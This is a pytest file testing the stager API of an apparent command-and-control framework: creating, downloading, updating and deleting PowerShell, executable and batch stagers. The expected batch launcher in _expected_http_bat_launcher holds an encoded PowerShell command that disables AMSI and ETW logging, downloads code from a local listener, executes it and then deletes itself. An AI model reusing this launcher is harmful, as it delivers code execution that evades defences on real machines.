from textwrap import dedent

import pytest


@pytest.fixture(scope="module", autouse=True)
def cleanup_stagers(session_local, models):
    yield

    with session_local.begin() as db:
        db.query(models.stager_download_assc).delete()
        db.query(models.upload_download_assc).delete()
        db.query(models.Stager).delete()
        db.query(models.Download).delete()


def test_get_stager_templates(client, admin_auth_header):
    response = client.get(
        "/api/v2/stager-templates/",
        headers=admin_auth_header,
    )
    assert response.status_code == 200
    assert len(response.json()["records"]) == 36


def test_get_stager_template(client, admin_auth_header):
    response = client.get(
        "/api/v2/stager-templates/multi_launcher",
        headers=admin_auth_header,
    )
    assert response.status_code == 200
    assert response.json()["name"] == "Launcher"
    assert response.json()["id"] == "multi_launcher"
    assert type(response.json()["options"]) == dict


def test_create_stager_validation_fails_required_field(
    client, base_stager, admin_auth_header
):
    base_stager["options"]["Listener"] = ""
    response = client.post(
        "/api/v2/stagers/", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 400
    assert response.json()["detail"] == "required option missing: Listener"


def test_create_stager_validation_fails_strict_field(
    client, base_stager, admin_auth_header
):
    base_stager["options"]["Language"] = "ABCDEF"
    response = client.post(
        "/api/v2/stagers/", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 400
    assert (
        response.json()["detail"]
        == "Language must be set to one of the suggested values."
    )


# def test_create_stager_custom_validation_fails():
#     stager = get_base_stager()
#     stager['options']['Language'] = 'powershell'
#     response = client.post("/api/v2/stagers/", json=stager)
#     assert response.status_code == 400
#     assert response.json()['detail'] == 'Error generating'


def test_create_stager_template_not_found(client, base_stager, admin_auth_header):
    base_stager["template"] = "qwerty"

    response = client.post(
        "/api/v2/stagers/", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 400
    assert response.json()["detail"] == "Stager Template qwerty not found"


def test_create_stager_one_liner(client, base_stager, admin_auth_header):
    # test that it ignore extra params
    base_stager["options"]["xyz"] = "xyz"

    response = client.post(
        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 201
    assert response.json()["options"].get("xyz") is None
    assert len(response.json().get("downloads", [])) > 0
    assert (
        response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
    )

    client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)


def test_create_obfuscated_stager_one_liner(client, base_stager, admin_auth_header):
    # test that it ignore extra params
    base_stager["options"]["xyz"] = "xyz"

    base_stager["name"] = "My_Obfuscated_Stager"
    base_stager["options"]["Obfuscate"] = "True"

    response = client.post(
        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 201
    assert response.json()["options"].get("xyz") is None
    assert len(response.json().get("downloads", [])) > 0
    assert (
        response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
    )

    client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)


def test_create_stager_file(client, base_stager_2, admin_auth_header):
    # test that it ignore extra params
    base_stager_2["options"]["xyz"] = "xyz"

    response = client.post(
        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager_2
    )
    assert response.status_code == 201
    assert response.json()["options"].get("xyz") is None
    assert len(response.json().get("downloads", [])) > 0
    assert (
        response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
    )

    client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)


def test_create_stager_name_conflict(client, base_stager, admin_auth_header):
    response = client.post(
        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 201
    stager_id = response.json()["id"]

    response = client.post(
        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 400
    assert (
        response.json()["detail"]
        == f'Stager with name {base_stager["name"]} already exists.'
    )

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)


def test_create_stager_save_false(client, base_stager, admin_auth_header):
    response = client.post(
        "/api/v2/stagers/?save=false", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 201
    assert response.json()["id"] == 0
    assert len(response.json().get("downloads", [])) > 0
    assert (
        response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
    )


def test_get_stager(client, admin_auth_header, base_stager):
    response = client.post(
        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager
    )
    stager_id = response.json()["id"]

    assert response.status_code == 201

    response = client.get(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
    )
    assert response.status_code == 200
    assert response.json()["id"] == stager_id

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)


def test_get_stager_not_found(client, admin_auth_header):
    response = client.get(
        "/api/v2/stagers/9999",
        headers=admin_auth_header,
    )
    assert response.status_code == 404
    assert response.json()["detail"] == "Stager not found for id 9999"


def test_update_stager_not_found(client, base_stager, admin_auth_header):
    response = client.put(
        "/api/v2/stagers/9999", headers=admin_auth_header, json=base_stager
    )
    assert response.status_code == 404
    assert response.json()["detail"] == "Stager not found for id 9999"


def test_download_stager_one_liner(client, admin_auth_header, base_stager):
    response = client.post(
        "/api/v2/stagers/?save=true",
        headers=admin_auth_header,
        json=base_stager,
    )
    assert response.status_code == 201
    stager_id = response.json()["id"]

    response = client.get(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
    )
    response = client.get(
        response.json()["downloads"][0]["link"],
        headers=admin_auth_header,
    )
    assert response.status_code == 200
    assert response.headers.get("content-type").split(";")[0] == "text/plain"
    assert response.text.startswith("powershell -noP -sta")

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)


def test_download_stager_file(client, admin_auth_header, base_stager_2):
    response = client.post(
        "/api/v2/stagers/?save=true",
        headers=admin_auth_header,
        json=base_stager_2,
    )
    assert response.status_code == 201
    stager_id = response.json()["id"]

    response = client.get(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
    )
    response = client.get(
        response.json()["downloads"][0]["link"],
        headers=admin_auth_header,
    )
    assert response.status_code == 200
    assert response.headers.get("content-type").split(";")[0] in [
        "application/x-msdownload",
        "application/x-msdos-program",
    ]
    assert isinstance(response.content, bytes)

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)


def test_update_stager_allows_edits_and_generates_new_file(
    client, admin_auth_header, base_stager
):
    response = client.post(
        "/api/v2/stagers/?save=true",
        headers=admin_auth_header,
        json=base_stager,
    )
    assert response.status_code == 201
    stager_id = response.json()["id"]

    response = client.get(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
    )
    assert response.status_code == 200

    stager = response.json()
    original_name = stager["name"]
    stager["name"] = stager["name"] + "_updated!"
    stager["options"]["Base64"] = "False"

    response = client.put(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
        json=stager,
    )
    assert response.status_code == 200
    assert response.json()["options"]["Base64"] == "False"
    assert response.json()["name"] == original_name + "_updated!"

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)


def test_update_stager_name_conflict(client, admin_auth_header, base_stager):
    response = client.post(
        "/api/v2/stagers/?save=true",
        headers=admin_auth_header,
        json=base_stager,
    )
    assert response.status_code == 201
    stager_id = response.json()["id"]

    response = client.get(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
    )
    assert response.status_code == 200

    base_stager_2 = base_stager.copy()
    base_stager_2["name"] = "test_stager_2"
    response2 = client.post(
        "/api/v2/stagers/?save=true",
        headers=admin_auth_header,
        json=base_stager_2,
    )
    assert response2.status_code == 201
    stager_id_2 = response2.json()["id"]

    response2 = client.get(
        f"/api/v2/stagers/{stager_id_2}",
        headers=admin_auth_header,
    )
    assert response.status_code == 200
    stager_1 = response.json()
    stager_2 = response2.json()

    stager_1["name"] = stager_2["name"]
    response = client.put(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
        json=stager_1,
    )

    assert response.status_code == 400
    assert (
        response.json()["detail"]
        == f"Stager with name {stager_2['name']} already exists."
    )

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
    client.delete(f"/api/v2/stagers/{stager_id_2}", headers=admin_auth_header)


def test_get_stagers(client, admin_auth_header, base_stager):
    response = client.post(
        "/api/v2/stagers/?save=true",
        headers=admin_auth_header,
        json=base_stager,
    )
    assert response.status_code == 201
    stager_id = response.json()["id"]

    base_stager_2 = base_stager.copy()
    base_stager_2["name"] = "test_stager_2"
    response = client.post(
        "/api/v2/stagers/?save=true",
        headers=admin_auth_header,
        json=base_stager_2,
    )
    assert response.status_code == 201
    stager_id_2 = response.json()["id"]

    response = client.get(
        "/api/v2/stagers",
        headers=admin_auth_header,
    )

    assert response.status_code == 200
    assert len(response.json()["records"]) == 2
    assert response.json()["records"][0]["id"] == stager_id
    assert response.json()["records"][1]["id"] == stager_id_2

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
    client.delete(f"/api/v2/stagers/{stager_id_2}", headers=admin_auth_header)


def test_delete_stager(client, admin_auth_header, base_stager):
    response = client.post(
        "/api/v2/stagers/?save=true",
        headers=admin_auth_header,
        json=base_stager,
    )
    assert response.status_code == 201
    stager_id = response.json()["id"]

    response = client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
    assert response.status_code == 204


def test_pyinstaller_stager_creation(client, pyinstaller_stager, admin_auth_header):
    response = client.post(
        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=pyinstaller_stager
    )

    # Check if the stager is successfully created
    assert response.status_code == 201
    assert response.json()["id"] != 0

    stager_id = response.json()["id"]

    response = client.get(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
    )

    # Check if we can successfully retrieve the stager
    assert response.status_code == 200
    assert response.json()["id"] == stager_id

    response = client.get(
        response.json()["downloads"][0]["link"],
        headers=admin_auth_header,
    )

    # Check if the file is downloaded successfully
    assert response.status_code == 200
    assert response.headers.get("content-type").split(";")[0] == "text/plain"
    assert isinstance(response.content, bytes)

    # Check if the downloaded file is not empty
    assert len(response.content) > 0

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)


def test_bat_stager_creation(client, bat_stager, admin_auth_header):
    response = client.post(
        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=bat_stager
    )

    # Check if the stager is successfully created
    assert response.status_code == 201
    assert response.json()["id"] != 0

    stager_id = response.json()["id"]

    response = client.get(
        f"/api/v2/stagers/{stager_id}",
        headers=admin_auth_header,
    )

    # Check if we can successfully retrieve the stager
    assert response.status_code == 200
    assert response.json()["id"] == stager_id

    response = client.get(
        response.json()["downloads"][0]["link"],
        headers=admin_auth_header,
    )

    # Check if the file is downloaded successfully
    assert response.status_code == 200
    assert (
        response.headers.get("content-type").split(";")[0]
        == "application/x-msdos-program"
    )
    assert isinstance(response.content, bytes)

    # Check if the downloaded file is not empty
    assert len(response.content) > 0
    assert response.content.decode("utf-8") == _expected_http_bat_launcher()

    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)


def _expected_http_bat_launcher():
    return dedent(
        """
        @echo off
        start /B powershell.exe -nop -ep bypass -w 1 -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAEUAdgBlAG4AdABpAG4AZwAuAEUAdgBlAG4AdABQAHIAbwB2AGkAZABlAHIAXQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAbQBfAGUAbgBhAGIAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABJAG4AcwB0AGEAbgBjAGUAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFQAcgBhAGMAaQBuAGcALgBQAFMARQB0AHcATABvAGcAUAByAG8AdgBpAGQAZQByACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAZQB0AHcAUAByAG8AdgBpAGQAZQByACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkALAAwACkAOwAkAFIAZQBmAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AHYAYQBsAHUAZQAoACQATgB1AGwAbAAsACQAdAByAHUAZQApADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBpAHcAcgAoACcAaAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADEAMwAzADYALwBkAG8AdwBuAGwAbwBhAGQALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8AJwApAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAfABpAGUAeAA=
        timeout /t 1 > nul
        del "%~f0"
        """
    ).strip()
